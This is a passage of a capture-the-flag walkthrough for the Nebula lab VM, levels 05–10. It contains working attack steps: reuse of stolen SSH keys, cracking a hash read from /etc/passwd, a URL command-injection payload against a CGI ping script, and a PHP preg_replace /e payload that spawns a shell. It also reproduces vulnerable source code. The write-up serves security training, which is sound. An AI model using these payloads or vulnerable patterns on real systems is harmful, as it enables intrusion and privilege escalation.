.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Right so let's use these keys to login as &lt;em&gt;flag05&lt;/em&gt;.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level05&amp;#64;nebula:/home/flag05/.backup$&lt;/span&gt; ssh -i /tmp/.ssh/id_rsa flag05&amp;#64;localhost
&lt;span class="go"&gt;
&lt;/span&gt;&lt;span class="gp"&gt;flag05&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-06"&gt;
&lt;h2&gt;Level 06&lt;/h2&gt;
&lt;blockquote&gt;
The flag06 account credentials came from a legacy unix system.&lt;/blockquote&gt;
&lt;p&gt;To cut a long story short, the way the password is stored for this user is not the same as for the other users. In older * nix systems the password was stored inside the &lt;code&gt;/etc/passwd&lt;/code&gt; file. So let's take a look:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level06&amp;#64;nebula:/home/flag06$&lt;/span&gt; cat /etc/passwd &lt;span class="p"&gt;|&lt;/span&gt; grep flag06
&lt;span class="go"&gt;flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Yep, there's the encrypted password. Grab that line and run it through John The Ripper&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh &amp;gt; nebula.txt
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; john nebula.txt  -show
&lt;span class="go"&gt;flag06:hello:993:993::/home/flag06:/bin/sh

1 password hash cracked, 0 left&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;That's that, now back on the nebula box&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level06&amp;#64;nebula:/home/flag06$&lt;/span&gt; ssh flag06&amp;#64;localhost
&lt;span class="go"&gt;
flag06&amp;#64;localhost's password: hello

&lt;/span&gt;&lt;span class="gp"&gt;getflag06&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-07"&gt;
&lt;h2&gt;Level 07&lt;/h2&gt;
&lt;blockquote&gt;
The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/blockquote&gt;
&lt;pre class="code perl literal-block"&gt;
&lt;span class="ch"&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="n"&gt;CGI&lt;/span&gt; &lt;span class="sx"&gt;qw{param}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;sub &lt;/span&gt;&lt;span class="nf"&gt;ping&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="nv"&gt;&amp;#64;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sb"&gt;`ping -c 3 $host 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="nv"&gt;$line&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;&amp;#64;output&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# check if Host set. if not, display normal page, etc&lt;/span&gt;

&lt;span class="n"&gt;ping&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Host&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So the Nebula machine has a webserver running. Checking the config file we can see that it's running on port 7007. The script tells us that it's expecting a &lt;code&gt;Host&lt;/code&gt; parameter. So let's hit the server from our web browser at the following URL (your IP will depend on what IP your VM has) &lt;code&gt;http://192.168.56.102:7007/index.cgi?Host=192.168.56.102&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Basically I am pinging the same host. The webpage will display the output of the ping command.&lt;/p&gt;
&lt;p&gt;We can't change the ping call, but we have control over what gets passed to the command. Let's craft a special URL&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; curl http://192.168.56.102:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;127.0.0.1%20%26%26%20getflag
&lt;span class="go"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.117 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.028/0.060/0.117/0.040 ms
You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Notice we need to encode the URL parms. The plaintext URL is &lt;code&gt;http://192.168.56.102:7007/index.cgi?Host=127.0.0.1 &amp;amp;&amp;amp; getflag&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-08"&gt;
&lt;h2&gt;Level 08&lt;/h2&gt;
&lt;blockquote&gt;
World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/blockquote&gt;
&lt;p&gt;Let's take a look then&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level08&amp;#64;nebula:/home/flag08$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 18
drwxr-x--- 1 flag08 level08   60 2014-06-14 14:10 .
drwxr-xr-x 1 root   root     500 2012-08-27 07:18 ..
-rw------- 1 flag08 flag08    13 2014-06-14 14:10 .bash_history
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The only interesting file that's readable here is &lt;code&gt;capture.pcap&lt;/code&gt;. Let's copy it out and use &lt;em&gt;Wireshark&lt;/em&gt; to take a look at it.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; scp level08&amp;#64;192.168.56.102:/home/flag08/capture.pcap .
&lt;span class="go"&gt;
level08&amp;#64;192.168.56.102's password:
capture.pcap                                  100% 8302     8.1KB/s   00:00&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Once in Wireshark we can see a TCP stream. Right click on one of the entries and select &lt;code&gt;Follow TCP Stream&lt;/code&gt;. A new window will appear in which we can see a login attempt. Red entries are user input, and blue entries are the server responses. The username is &lt;code&gt;level08&lt;/code&gt;. The password is... well, take a look. Notice the &lt;code&gt;7f&lt;/code&gt; entries. Those are deletes.&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/IEseNUh.png"&gt;&lt;img alt="" src="http://i.imgur.com/IEseNUh.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;So....&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level08&amp;#64;nebula:/home/flag08$&lt;/span&gt; ssh flag08&amp;#64;localhost
&lt;span class="go"&gt;
flag08&amp;#64;localhost's password: backd00Rmate

&lt;/span&gt;&lt;span class="gp"&gt;flag08&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-09"&gt;
&lt;h2&gt;Level 09&lt;/h2&gt;
&lt;blockquote&gt;
There's a C setuid wrapper for some vulnerable PHP code...&lt;/blockquote&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;spam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/\./&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; dot &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nv"&gt;$email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;#64;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; AT &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;markup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$use_me&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/(\[email (.*)\])/e&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;spam(&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;\\&lt;/span&gt;&lt;span class="s2"&gt;2&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/\[/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/\]/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;markup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;$argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nv"&gt;$output&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Let's run it to see what it actually does.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level09&amp;#64;nebula:/home/flag09$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;email mail&amp;#64;test.com&lt;span class="o"&gt;]&lt;/span&gt; &amp;gt; /tmp/test.txt
&lt;span class="gp"&gt;level09&amp;#64;nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test.txt fasdf
&lt;span class="go"&gt;mail AT test dot com&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So the vulnerable part here is the &lt;cite&gt;preg_replace&lt;/cite&gt; with the &lt;em&gt;e&lt;/em&gt; flag. For information on this see &lt;a class="reference external" href="https://bugs.php.net/bug.php?id=35960"&gt;https://bugs.php.net/bug.php?id=35960&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So there's a few ways we can exploit this. We basically need to pass a command to the script that will get executed in the &lt;code&gt;preg_replace&lt;/code&gt;. Let's try to simply get a shell as the &lt;em&gt;flag09&lt;/em&gt; user and get our flag.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level09&amp;#64;nebula:/home/flag09$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'[email ${${&amp;#64;system('&lt;/span&gt;sh&lt;span class="s1"&gt;')}}]'&lt;/span&gt; &amp;gt; /tmp/test.txt
&lt;span class="gp"&gt;level09&amp;#64;nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test.txt fasdf
&lt;span class="gp"&gt;sh-4.2$&lt;/span&gt; whoami
&lt;span class="go"&gt;flag09
&lt;/span&gt;&lt;span class="gp"&gt;sh-4.2$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-10"&gt;
&lt;h2&gt;Level 10&lt;/h2&gt;
&lt;blockquote&gt;
The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s file host&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;sends file to host if you have access to it&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;R_OK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ffd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt; &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Connecting to %s:18211 .. &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_family&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;inet_addr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;htons&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;18211&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to connect to host %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HITHERE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HITHERE&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to write banner to host %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
